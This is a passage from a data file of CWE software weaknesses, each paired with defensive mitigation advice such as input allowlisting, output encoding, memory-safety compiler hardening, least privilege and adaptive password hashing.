      "::PHASE:Architecture and Design:DESCRIPTION:When the set of filenames is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames, and reject all other inputs. For example, ID 1 could map to inbox.txt and ID 2 could map to profile.txt. Features such as the ESAPI AccessReferenceMap provide this capability.::PHASE:Architecture and Design Operation:DESCRIPTION:Run your code in a jail or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict all access to files within a particular directory. Examples include the Unix chroot jail and AppArmor. In general, managed code may provide some protection. This may not be a feasible solution, and it only limits the impact to the operating system; the rest of your application may still be subject to compromise. Be careful to avoid CWE-243 and other weaknesses related to jails.::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When validating filenames, use stringent allowlists that limit the character set to be used. If feasible, only allow a single . character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as / to avoid CWE-36. Use a list of allowable file extensions, which will help to avoid CWE-434. Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a denylist, which may be incomplete (CWE-184). For example, filtering / is insufficient protection if the filesystem also supports the use of as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ../ sequences are removed from the .../...// string in a sequential fashion, two instances of ../ would be removed from the original string, but the remaining characters would still form the ../ string.:EFFECTIVENESS:High::PHASE:Implementation:DESCRIPTION:Use a built-in path canonicalization function (such as realpath() in C) that produces the canonical version of the pathname, which effectively removes .. sequences and symbolic links (CWE-23, CWE-59).::PHASE:Installation Operation:DESCRIPTION:Use OS-level permissions and run as a low-privileged user to limit the scope of any successful attack.::PHASE:Operation Implementation:DESCRIPTION:If you are using PHP, configure your application so that it does not use register_globals. During implementation, develop your application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.::PHASE:Testing:DESCRIPTION:Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.::"
    ],
    [
      "improper neutralization of script in attributes in a web page",
      "CWE-83",
      "::PHASE:Implementation:DESCRIPTION:Carefully check each input parameter against a rigorous positive specification (allowlist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including tag attributes, hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.::PHASE:Implementation:STRATEGY:Output Encoding:DESCRIPTION:Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component. The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.::PHASE:Implementation:DESCRIPTION:With Struts, write all data from form beans with the bean's filter attribute set to true.::PHASE:Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.:EFFECTIVENESS:Defense in Depth::"
    ],
    [
      "direct use of unsafe jni",
      "CWE-111",
      "::PHASE:Implementation:DESCRIPTION:Implement error handling around the JNI call.::PHASE:Implementation:STRATEGY:Refactoring:DESCRIPTION:Do not use JNI calls if you don't trust the native library.::PHASE:Implementation:STRATEGY:Refactoring:DESCRIPTION:Be reluctant to use JNI calls. A Java API equivalent may exist.::"
    ],
    [
      "incorrect calculation of buffer size",
      "CWE-131",
      "::PHASE:Implementation:DESCRIPTION:When allocating a buffer for the purpose of transforming, converting, or encoding an input, allocate enough memory to handle the largest possible encoding. For example, in a routine that converts & characters to &amp; for HTML entity encoding, the output buffer needs to be at least 5 times as large as the input buffer.::PHASE:Implementation:DESCRIPTION:Understand the programming language's underlying representation and how it interacts with numeric calculation (CWE-681). Pay close attention to byte size discrepancies, precision, signed/unsigned distinctions, truncation, conversion and casting between types, not-a-number calculations, and how the language handles numbers that are too large or too small for its underlying representation. [REF-7] Also be careful to account for 32-bit, 64-bit, and other potential differences that may affect the numeric representation.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Perform input validation on any numeric input by ensuring that it is within the expected range. Enforce that the input meets both the minimum and maximum requirements for the expected range.::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.::PHASE:Implementation:DESCRIPTION:When processing structured incoming data containing a size field followed by raw data, identify and resolve any inconsistencies between the size field and the actual size of the data (CWE-130).::PHASE:Implementation:DESCRIPTION:When allocating memory that uses sentinels to mark the end of a data structure - such as NUL bytes in strings - make sure you also include the sentinel in your calculation of the total amount of memory that must be allocated.::PHASE:Implementation:DESCRIPTION:Replace unbounded copy functions with analogous functions that support length arguments, such as strcpy with strncpy. Create these if they are not available.:EFFECTIVENESS:Moderate::PHASE:Implementation:DESCRIPTION:Use sizeof() on the appropriate data type to avoid CWE-467.::PHASE:Implementation:DESCRIPTION:Use the appropriate type for the desired action. For example, in C/C++, only use unsigned types for values that could never be negative, such as height, width, or other numbers related to quantity. This will simplify validation and will reduce surprises related to unexpected casting.::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. Use libraries or frameworks that make it easier to handle numbers without unexpected consequences, or buffer allocation routines that automatically track buffer size. Examples include safe integer handling packages such as SafeInt (C++) or IntegerLib (C or C++). [REF-106]::PHASE:Operation Build and Compilation:STRATEGY:Environment Hardening:DESCRIPTION:Use automatic buffer overflow detection mechanisms that are offered by certain compilers or compiler extensions. Examples include: the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice, which provide various mechanisms including canary-based detection and range/index checking. D3-SFCV (Stack Frame Canary Validation) from D3FEND [REF-1334] discusses canary-based detection in detail.:EFFECTIVENESS:Defense in Depth::PHASE:Operation Build and Compilation:STRATEGY:Environment Hardening:DESCRIPTION:Run or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code. Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64]. Imported modules may be similarly realigned if their default memory addresses conflict with other modules, in a process known as rebasing (for Windows) and prelinking (for Linux) [REF-1332] using randomly generated addresses. ASLR for libraries cannot be used in conjunction with prelink since it would require relocating the libraries at run-time, defeating the whole purpose of prelinking. For more information on these techniques see D3-SAOR (Segment Address Offset Randomization) from D3FEND [REF-1335].:EFFECTIVENESS:Defense in Depth::PHASE:Operation:STRATEGY:Environment Hardening:DESCRIPTION:Use a CPU and operating system that offers Data Execution Protection (using hardware NX or XD bits) or the equivalent techniques that simulate this feature in software, such as PaX [REF-60] [REF-61]. These techniques ensure that any instruction executed is exclusively at a memory address that is part of the code segment. For more information on these techniques see D3-PSEP (Process Segment Execution Prevention) from D3FEND [REF-1336].:EFFECTIVENESS:Defense in Depth::PHASE:Implementation:STRATEGY:Compilation or Build Hardening:DESCRIPTION:Examine compiler warnings closely and eliminate problems with potential security implications, such as signed / unsigned mismatch in memory operations, or use of uninitialized variables. Even if the weakness is rarely exploitable, a single failure may lead to the compromise of the entire system.::PHASE:Architecture and Design Operation:STRATEGY:Environment Hardening:DESCRIPTION:Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.::PHASE:Architecture and Design Operation:STRATEGY:Sandbox or Jail:DESCRIPTION:Run the code in a jail or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software. OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations. This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise. Be careful to avoid CWE-243 and other weaknesses related to jails.:EFFECTIVENESS:Limited::"
    ],
    [
      "use of externally-controlled format string",
      "CWE-134",
      "::PHASE:Requirements:DESCRIPTION:Choose a language that is not subject to this flaw.::PHASE:Implementation:DESCRIPTION:Ensure that all format string functions are passed a static string which cannot be controlled by the user, and that the proper number of arguments are always sent to that function as well. If at all possible, use functions that do not support the %n operator in format strings. [REF-116] [REF-117]::PHASE:Build and Compilation:DESCRIPTION:Run compilers and linkers with high warning levels, since they may detect incorrect usage.::"
    ],
    [
      "integer coercion error",
      "CWE-192",
      "::PHASE:Requirements:DESCRIPTION:A language which throws exceptions on ambiguous data casts might be chosen.::PHASE:Architecture and Design:DESCRIPTION:Design objects and program flow such that multiple or complex casts are unnecessary::PHASE:Implementation:DESCRIPTION:Ensure that any data type casting that you must used is entirely understood in order to reduce the plausibility of error in use.::"
    ],
    [
      "signed to unsigned conversion error",
      "CWE-195",
      ""
    ],
    [
      "unsigned to signed conversion error",
      "CWE-196",
      "::PHASE:Requirements:DESCRIPTION:Choose a language which is not subject to these casting flaws.::PHASE:Architecture and Design:DESCRIPTION:Design object accessor functions to implicitly check values for valid sizes. Ensure that all functions which will be used as a size are checked previous to use as a size. If the language permits, throw exceptions rather than using in-band errors.::PHASE:Implementation:DESCRIPTION:Error check the return values of all functions. Be aware of implicit casts made, and use unsigned variables for sizes if at all possible.::"
    ],
    [
      "use of incorrect byte ordering",
      "CWE-198",
      ""
    ],
    [
      "failure to handle missing parameter",
      "CWE-234",
      "::PHASE:Build and Compilation:DESCRIPTION:This issue can be simply combated with the use of proper build process.::PHASE:Implementation:DESCRIPTION:Forward declare all functions. This is the recommended solution. Properly forward declaration of all used functions will result in a compiler error if too few arguments are sent to a function.::"
    ],
    [
      "failure to handle incomplete element",
      "CWE-239",
      ""
    ],
    [
      "use of inherently dangerous function",
      "CWE-242",
      "::PHASE:Implementation Requirements:DESCRIPTION:Ban the use of dangerous functions. Use their safe equivalent.::PHASE:Testing:DESCRIPTION:Use grep or static analysis tools to spot usage of dangerous functions.::"
    ],
    [
      "unchecked return value",
      "CWE-252",
      "::PHASE:Implementation:DESCRIPTION:Check the results of all functions that return a value and verify that the value is expected.:EFFECTIVENESS:High::PHASE:Implementation:DESCRIPTION:Ensure that you account for all possible return values from the function.::PHASE:Implementation:DESCRIPTION:When designing a function, make sure you return a value or throw an exception in case of an error.::"
    ],
    [
      "incorrect check of function return value",
      "CWE-253",
      "::PHASE:Architecture and Design:STRATEGY:Language Selection:DESCRIPTION:Use a language or compiler that uses exceptions and requires the catching of those exceptions.::PHASE:Implementation:DESCRIPTION:Properly check all functions which return a value.::PHASE:Implementation:DESCRIPTION:When designing any function make sure you return a value or throw an exception in case of an error.::"
    ],
    [
      "reliance on ip address for authentication",
      "CWE-291",
      "::PHASE:Architecture and Design:DESCRIPTION:Use other means of identity verification that cannot be simply spoofed. Possibilities include a username/password or certificate.::"
    ],
    [
      "missing authentication for critical function",
      "CWE-306",
      "::PHASE:Architecture and Design:DESCRIPTION:Divide the software into anonymous, normal, privileged, and administrative areas. Identify which of these areas require a proven user identity, and use a centralized authentication capability. Identify all potential communication channels, or other means of interaction with the software, to ensure that all channels are appropriately protected, including those channels that are assumed to be accessible only by authorized parties. Developers sometimes perform authentication at the primary channel, but open up a secondary channel that is assumed to be private. For example, a login mechanism may be listening on one network port, but after successful authentication, it may open up a second port where it waits for the connection, but avoids authentication because it assumes that only the authenticated party will connect to the port. In general, if the software or protocol allows a single session or user state to persist across multiple connections or channels, authentication and appropriate credential management need to be used throughout.::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.::PHASE:Architecture and Design:DESCRIPTION:Where possible, avoid implementing custom, grow-your-own authentication routines and consider using authentication capabilities as provided by the surrounding framework, operating system, or environment. These capabilities may avoid common weaknesses that are unique to authentication; support automatic auditing and tracking; and make it easier to provide a clear separation between authentication tasks and authorization tasks. In environments such as the World Wide Web, the line between authentication and authorization is sometimes blurred. If custom authentication routines are required instead of those provided by the server, then these routines must be applied to every single page, since these pages could be requested directly.::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, consider using libraries with authentication capabilities such as OpenSSL or the ESAPI Authenticator [REF-45].::PHASE:Implementation System Configuration Operation:DESCRIPTION:When storing data in the cloud (e.g., S3 buckets, Azure blobs, Google Cloud Storage, etc.), use the provider's controls to require strong authentication for users who should be allowed to access the data [REF-1297] [REF-1298] [REF-1302].::"
    ],
    [
      "use of password system for primary authentication",
      "CWE-309",
      "::PHASE:Architecture and Design:DESCRIPTION:In order to protect password systems from compromise, the following should be noted: Passwords should be stored safely to prevent insider attack and to ensure that -- if a system is compromised -- the passwords are not retrievable. Due to password reuse, this information may be useful in the compromise of other systems these users work with. In order to protect these passwords, they should be stored encrypted, in a non-reversible state, such that the original text password cannot be extracted from the stored value. Password aging should be strictly enforced to ensure that passwords do not remain unchanged for long periods of time. The longer a password remains in use, the higher the probability that it has been compromised. For this reason, passwords should require refreshing periodically, and users should be informed of the risk of passwords which remain in use for too long. Password strength should be enforced intelligently. Rather than restrict passwords to specific content, or specific length, users should be encouraged to use upper and lower case letters, numbers, and symbols in their passwords. The system should also ensure that no passwords are derived from dictionary words.::PHASE:Architecture and Design:DESCRIPTION:Use a zero-knowledge password protocol, such as SRP.::PHASE:Architecture and Design:DESCRIPTION:Ensure that passwords are stored safely and are not reversible.::PHASE:Architecture and Design:DESCRIPTION:Implement password aging functionality that requires passwords be changed after a certain point.::PHASE:Architecture and Design:DESCRIPTION:Use a mechanism for determining the strength of a password and notify the user of weak password use.::PHASE:Architecture and Design:DESCRIPTION:Inform the user of why password protections are in place, how they work to protect data integrity, and why it is important to heed their warnings.::"
    ],
    [
      "cleartext storage in a file or on disk",
      "CWE-313",
      ""
    ],
    [
      "cleartext storage of sensitive information in memory",
      "CWE-316",
      ""
    ],
    [
      "use of hard-coded cryptographic key",
      "CWE-321",
      "::PHASE:Architecture and Design:DESCRIPTION:Prevention schemes mirror that of hard-coded password storage.::"
    ],
    [
      "use of invariant value in dynamically changing context",
      "CWE-344",
      ""
    ],
    [
      "use of less trusted source",
      "CWE-348",
      ""
    ],
    [
      "trust of system event data",
      "CWE-360",
      "::PHASE:Architecture and Design:DESCRIPTION:Never trust or rely any of the information in an Event for security.::"
    ],
    [
      "creation of temporary file in directory with insecure permissions",
      "CWE-379",
      "::PHASE:Requirements:DESCRIPTION:Many contemporary languages have functions which properly handle this condition. Older C temp file functions are especially susceptible.::PHASE:Implementation:DESCRIPTION:Try to store sensitive tempfiles in a directory which is not world readable -- i.e., per-user directories.::PHASE:Implementation:DESCRIPTION:Avoid using vulnerable temp file functions.::"
    ],
    [
      "return of wrong status code",
      "CWE-393",
      ""
    ],
    [
      "unexpected status code or return value",
      "CWE-394",
      ""
    ],
    [
      "use after free",
      "CWE-416",
      "::PHASE:Architecture and Design:STRATEGY:Language Selection:DESCRIPTION:Choose a language that provides automatic memory management.::PHASE:Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:When freeing pointers, be sure to set them to NULL once they are freed. However, the utilization of multiple or complex data structures may lower the usefulness of this strategy.:EFFECTIVENESS:Defense in Depth::"
    ],
    [
      "unquoted search path or element",
      "CWE-428",
      "::PHASE:Implementation:DESCRIPTION:Properly quote the full search path before executing a program on the system.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.::"
    ],
    [
      "behavioral change in new version or environment",
      "CWE-439",
      ""
    ],
    [
      "user interface (ui) misrepresentation of critical information",
      "CWE-451",
      "::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Perform data validation (e.g. syntax, length, etc.) before interpreting the data.::PHASE:Architecture and Design:STRATEGY:Output Encoding:DESCRIPTION:Create a strategy for presenting information, and plan for how to display unusual characters.::"
    ],
    [
      "return of pointer value outside of expected range",
      "CWE-466",
      ""
    ],
    [
      "use of sizeof() on a pointer type",
      "CWE-467",
      "::PHASE:Implementation:DESCRIPTION:Use expressions such as sizeof(*pointer) instead of sizeof(pointer), unless you intend to run sizeof() on a pointer type to gain some platform independence or if you are allocating a variable on the stack.::"
    ],
    [
      "use of pointer subtraction to determine size",
      "CWE-469",
      "::PHASE:Implementation:DESCRIPTION:Save an index variable. This is the recommended solution. Rather than subtract pointers from one another, use an index variable of the same size as the pointers in question. Use this variable to walk from one pointer to the other and calculate the difference. Always validate this number.::"
    ],
    [
      "use of function with inconsistent implementations",
      "CWE-474",
      "::PHASE:Architecture and Design Requirements:DESCRIPTION:Do not accept inconsistent behavior from the API specifications when the deviant behavior increase the risk level.::"
    ],
    [
      "use of obsolete function",
      "CWE-477",
      "::PHASE:Implementation:DESCRIPTION:Refer to the documentation for the obsolete function in order to determine why it is deprecated or obsolete and to learn about alternative ways to achieve the same functionality.::PHASE:Requirements:DESCRIPTION:Consider seriously the security implications of using an obsolete function. Consider using alternate functions.::"
    ],
    [
      "signal handler use of a non-reentrant function",
      "CWE-479",
      "::PHASE:Requirements:DESCRIPTION:Require languages or libraries that provide reentrant functionality, or otherwise make it easier to avoid this weakness.::PHASE:Architecture and Design:DESCRIPTION:Design signal handlers to only set flags rather than perform complex functionality.::PHASE:Implementation:DESCRIPTION:Ensure that non-reentrant functions are not found in signal handlers.::PHASE:Implementation:DESCRIPTION:Use sanity checks to reduce the timing window for exploitation of race conditions. This is only a partial solution, since many attacks might fail, but other attacks still might work within the narrower window, even accidentally.:EFFECTIVENESS:Defense in Depth::"
    ],
    [
      "omitted break statement in switch",
      "CWE-484",
      "::PHASE:Implementation:DESCRIPTION:Omitting a break statement so that one may fall through is often indistinguishable from an error, and therefore should be avoided. If you need to use fall-through capabilities, make sure that you have clearly documented this within the switch statement, and ensure that you have examined all the logical possibilities.::PHASE:Implementation:DESCRIPTION:The functionality of omitting a break statement could be clarified with an if statement. This method is much safer.::"
    ],
    [
      "comparison of classes by name",
      "CWE-486",
      "::PHASE:Implementation:DESCRIPTION:Use class equivalency to determine type. Rather than use the class name to determine if an object is of a given type, use the getClass() method, and == operator.::"
    ],
    [
      "exposure of data element to wrong session",
      "CWE-488",
      "::PHASE:Architecture and Design:DESCRIPTION:Protect the application's sessions from information leakage. Make sure that a session's data is not used or visible by other sessions.::PHASE:Testing:DESCRIPTION:Use a static analysis tool to scan the code for information leakage vulnerabilities (e.g. Singleton Member Field).::PHASE:Architecture and Design:DESCRIPTION:In a multithreading environment, storing user data in Servlet member fields introduces a data access race condition. Do not use member fields to store information in the Servlet.::"
    ],
    [
      "use of inner class containing sensitive data",
      "CWE-492",
      "::PHASE:Implementation:DESCRIPTION:Using sealed classes protects object-oriented encapsulation paradigms and therefore protects code from being extended in unforeseen ways.::PHASE:Implementation:DESCRIPTION:Inner Classes do not provide security. Warning: Never reduce the security of the object from an outer class, going to an inner class. If an outer class is final or private, ensure that its inner class is private as well.::"
    ],
    [
      "cleartext storage of sensitive information in an environment variable",
      "CWE-526",
      "::PHASE:Architecture and Design:DESCRIPTION:Encrypt information stored in the environment variable to protect it from being exposed to an unauthorized user. If encryption is not feasible or is considered too expensive for the business use of the application, then consider using a properly protected configuration file instead of an environment variable. It should be understood that unencrypted information in a config file is also not guaranteed to be protected, but it is still a better choice, because it reduces attack surface related to weaknesses such as CWE-214. In some settings, vaults might be a feasible option for safer data transfer. Users should be notified of the business choice made to not protect the sensitive information through encryption.::PHASE:Implementation:DESCRIPTION:If the environment variable is not necessary for the desired behavior, then remove it entirely, or clear it to an empty value.::"
    ],
    [
      "inclusion of sensitive information in test code",
      "CWE-531",
      "::PHASE:Distribution Installation:DESCRIPTION:Remove test code before deploying the application into production.::"
    ],
    [
      "insertion of sensitive information into externally-accessible file or directory",
      "CWE-538",
      "::PHASE:Architecture and Design Operation System Configuration:DESCRIPTION:Do not expose file and directory information to the user.::"
    ],
    [
      "inclusion of sensitive information in source code",
      "CWE-540",
      "::PHASE:Architecture and Design System Configuration:DESCRIPTION:Recommendations include removing this script from the web server and moving it to a location not accessible from the Internet.::"
    ],
    [
      "inclusion of sensitive information in an include file",
      "CWE-541",
      "::PHASE:Architecture and Design:DESCRIPTION:Do not store sensitive information in include files.::PHASE:Architecture and Design System Configuration:DESCRIPTION:Protect include files from being exposed.::"
    ],
    [
      "return of stack variable address",
      "CWE-562",
      "::PHASE:Testing:DESCRIPTION:Use static analysis tools to spot return of the address of a stack variable.::"
    ],
    [
      "unsynchronized access to shared data in a multithreaded context",
      "CWE-567",
      "::PHASE:Implementation:DESCRIPTION:Remove the use of static variables used between servlets. If this cannot be avoided, use synchronized access for these variables.::"
    ],
    [
      "call to thread run() instead of start()",
      "CWE-572",
      "::PHASE:Implementation:DESCRIPTION:Use the start() method instead of the run() method.::"
    ],
    [
      "assignment of a fixed address to a pointer",
      "CWE-587",
      "::PHASE:Implementation:DESCRIPTION:Never set a pointer to a fixed address.::"
    ],
    [
      "free of memory not on the heap",
      "CWE-590",
      "::PHASE:Implementation:DESCRIPTION:Only free pointers that you have called malloc on previously. This is the recommended solution. Keep track of which pointers point at the beginning of valid chunks and free them only once.::PHASE:Implementation:DESCRIPTION:Before freeing a pointer, the programmer should make sure that the pointer was previously allocated on the heap and that the memory belongs to the programmer. Freeing an unallocated pointer will cause undefined behavior in the program.::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, glibc in Linux provides protection against free of invalid pointers.::PHASE:Architecture and Design:DESCRIPTION:Use a language that provides abstractions for memory allocation and deallocation.::PHASE:Testing:DESCRIPTION:Use a tool that dynamically detects memory management problems, such as valgrind.::"
    ],
    [
      "sensitive data storage in improperly locked memory",
      "CWE-591",
      "::PHASE:Architecture and Design:DESCRIPTION:Identify data that needs to be protected from swapping and choose platform-appropriate protection mechanisms.::PHASE:Implementation:DESCRIPTION:Check return values to ensure locking operations are successful.::"
    ],
    [
      "use of wrong operator in string comparison",
      "CWE-597",
      "::PHASE:Implementation:DESCRIPTION:Within Java, use .equals() to compare string values. Within JavaScript, use == to compare string values. Within PHP, use == to compare a numeric value to a string value. (PHP converts the string to a number.):EFFECTIVENESS:High::"
    ],
    [
      "use of get request method with sensitive query strings",
      "CWE-598",
      "::PHASE:Implementation:DESCRIPTION:When sensitive information is sent, use the POST method (e.g. registration form).::"
    ],
    [
      "inclusion of sensitive information in source code comments",
      "CWE-615",
      "::PHASE:Distribution:DESCRIPTION:Remove comments which have sensitive information about the design/implementation of the application. Some of the comments may be exposed to the user and affect the security posture of the application.::"
    ],
    [
      "reliance on file name or extension of externally-supplied file",
      "CWE-646",
      "::PHASE:Architecture and Design:DESCRIPTION:Make decisions on the server side based on file content and not on file name or extension.::"
    ],
    [
      "reliance on a single factor in a security decision",
      "CWE-654",
      "::PHASE:Architecture and Design:DESCRIPTION:Use multiple simultaneous checks before granting access to critical operations or granting critical privileges. A weaker but helpful mitigation is to use several successive checks (multiple layers of security).::PHASE:Architecture and Design:DESCRIPTION:Use redundant access rules on different choke points (e.g., firewalls).::"
    ],
    [
      "use of a non-reentrant function in a concurrent context",
      "CWE-663",
      "::PHASE:Implementation:DESCRIPTION:Use reentrant functions if available.::PHASE:Implementation:DESCRIPTION:Add synchronization to your non-reentrant function.::PHASE:Implementation:DESCRIPTION:In Java, use the ReentrantLock Class.::"
    ],
    [
      "use of potentially dangerous function",
      "CWE-676",
      "::PHASE:Build and Compilation Implementation:DESCRIPTION:Identify a list of prohibited API functions and prohibit developers from using these functions, providing safer alternatives. In some cases, automatic code analysis tools or the compiler can be instructed to spot use of prohibited functions, such as the banned.h include file from Microsoft's SDL. [REF-554] [REF-7]::"
    ],
    [
      "integer overflow to buffer overflow",
      "CWE-680",
      ""
    ],
    [
      "function call with incorrect order of arguments",
      "CWE-683",
      "::PHASE:Implementation:DESCRIPTION:Use the function, procedure, or routine as specified.::PHASE:Testing:DESCRIPTION:Because this function call often produces incorrect behavior it will usually be detected during testing or normal operation of the product. During testing exercise all possible control paths will typically expose this weakness except in rare cases when the incorrect function call accidentally produces the correct results or if the provided argument type is very similar to the expected argument type.::"
    ],
    [
      "function call with incorrect number of arguments",
      "CWE-685",
      "::PHASE:Testing:DESCRIPTION:Because this function call often produces incorrect behavior it will usually be detected during testing or normal operation of the product. During testing exercise all possible control paths will typically expose this weakness except in rare cases when the incorrect function call accidentally produces the correct results or if the provided argument type is very similar to the expected argument type.::"
    ],
    [
      "function call with incorrectly specified argument value",
      "CWE-687",
      ""
    ],
    [
      "function call with incorrect variable or reference as argument",
      "CWE-688",
      "::PHASE:Testing:DESCRIPTION:Because this function call often produces incorrect behavior it will usually be detected during testing or normal operation of the product. During testing exercise all possible control paths will typically expose this weakness except in rare cases when the incorrect function call accidentally produces the correct results or if the provided argument type is very similar to the expected argument type.::"
    ],
    [
      "unchecked return value to null pointer dereference",
      "CWE-690",
      ""
    ],
    [
      "use of incorrectly-resolved name or reference",
      "CWE-706",
      ""
    ],
    [
      "use of a one-way hash with a predictable salt",
      "CWE-760",
      "::PHASE:Architecture and Design:DESCRIPTION:Use an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations (stretching) or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use. Some hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead. Note that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.:EFFECTIVENESS:High::PHASE:Implementation:DESCRIPTION:If a technique that requires extra computational effort can not be implemented, then for each password that is processed, generate a new random salt using a strong random number generator with unpredictable seeds. Add the salt to the plaintext password before hashing it. When storing the hash, also store the salt. Do not use the same salt for every password.:EFFECTIVENESS:Limited::"
    ],
    [
      "free of pointer not at start of buffer",
      "CWE-761",
